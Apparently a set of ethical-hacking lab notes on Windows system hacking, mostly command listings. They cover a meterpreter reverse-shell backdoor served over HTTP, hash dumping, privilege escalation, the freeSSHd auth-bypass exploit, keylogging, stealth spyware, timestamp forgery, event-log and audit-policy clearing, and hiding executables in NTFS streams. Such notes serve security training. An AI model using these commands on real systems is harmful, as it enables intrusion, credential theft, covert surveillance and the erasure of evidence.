## System Hacking

1. Dumping and Cracking SAM Hashes - pwdump and ophcrack
SAM = security account manager database file in windows
uses LM and NTLM hash

```
# username and pasword has for the machine in a file
pwdump.exe > c:/hash.txt

load this file to ophcrack --> time to crack depends on complexity of password --> only alphanumeric
```

2. Cracking - rainbow tables
pre-calculate hash and create table --> compare new hash to quickly find plaintext

3. Cracking - L0phtCrack

4. Escalating Priviledge - using client side vulnerability
kali
```bash
service postgresql start
service metasploit start

# launch msfconsole
msfconsole

#create exe file in desktop
msf > msfpayload windows/meterpreter/reverse_tcp LHOST=172.17.19.67 X > Desktop/Exploit.exe

# new folder with appropriate permission
mkdir /var/www/share
chmod -R 755 /var/www/share
chown -R www-data:www-data /var/www/share

service apache2 start

cp /root/Desktop/Exploit.exe /var/www/share/

# create msfconsole handler
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST 172.17.19.67

# start handler
exploit -j -z

```

from windows
```
http://172.17.19.67/share
download and run Exploit.exe
```

kali
```
# metasploit session should not be open in kali

#now go into meterpreter shell
sessions -i 1

#current user
getuid
>>> ceh\administrator

#require elevated priviledge

#get windows password hash
run hashdump

#clear windows event
clearev

# unrestricted access to system using Service -named pipe impersonation
getsystem -t 1

getuid
>>> nt authority\system

# can run hashdump now
run hashdump 

```

5. exploiting freeSSHd

install freeSSHd in windows and configure on port 45


kali
```
service postgresql start
service metasploit start

msfconsole

use exploit/windows/ssh/freesshd_authbypass


#show available exploits
show options

set RHOST 172.17.19.61
set RPORT 45

# establish meterpreter session
exploit

# possible to capture screenshot, keystroke logging, etc

```

6. hacking windows 8.1 with metasploit and post-exploitation using meterpreter

start postgresql, metasploit
```
msfconsole

msfpayload windows/meterpreter/reverse_tcp LHOST=172.17.19.67 X > Desktop/Backdoor.exe

ls -la /var/www/ | grep share

service apache2 start

cp /root/Desktop/Backdoor.exe /var/www/share/

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST 172.17.19.67

show options

exploit -j -z
```

windows --> run backdoor.exe

kali
```
sessions -i

sessions -i 1

# can traverse through this user profile
sysinfo
pwd
ls
cat filename.txt

# show file last access
timestomp filename.txt -v

# change modified timestamp
timestomp filename.txt -m "06/15/2012 12:57:21"

# change created timestamp
timestomp filename.txt -c "06/15/2012 12:57:21"

# change accessed timestamp
timestomp filename.txt -a "06/15/2012 12:57:21"

# change entry modfied timestamp
timestomp filename.txt -e "06/15/2012 12:57:21"

# download
download firefox.exe

# search
search -f pagefile.sys

# key sniffer
keyscan_start
keyscan_dump

#screenshot
screenshot

shutdown
```

7. System monitoring using RemoteExec

```
remote exe --> remote job --> new remote job --> file execution
# file to execute
rcrack_gui.exe

```

8. User System Monitoring and surveillance using spytech spyAgent
```
install spytech spyagent in remote computer in stealth mode
```

9. Web Activity Monitoring and Recording with Power Spy 2014


continuous screenshots
keystroke
all application opened
all the documents created
clipboard content
audio


10. hiding Files using NTFS Streams

```
#hide file.exe inside file1.txt
#cmd prompt
>type c:\path\file.exe > c:\path\file2.txt:file.exe

# unhide the file with different name
>mklink backdoor.exe file1.txt:file.exe

#execute hidden file
>backdoor
```

11. find hidden files using ADS Spy
 scan computer to find files with hidden files

12. hiding files using white space steganography (snow)

```
create test1.txt with white space
#hiding with password magic
snow -C -m "my bank account number is 12345" -p "magic" test1.txt test2.txt
#viewing hidden
snow -C -p "magic" test2.txt
```

13. image steganography using openStego
```
hide file inside image and retrieve file
```

14. image steganography using quick stego
```
hide text inside image and retrieve text
```

15. viewing, editing and clearing audit policies using auditpol
```
#view all audit policies
auditpol /get /category:*

#set pollicies
auditpol /set /category:"system","account logon" /success:enable /failure:enable

#clear audit 
auditpol /clear /y
```






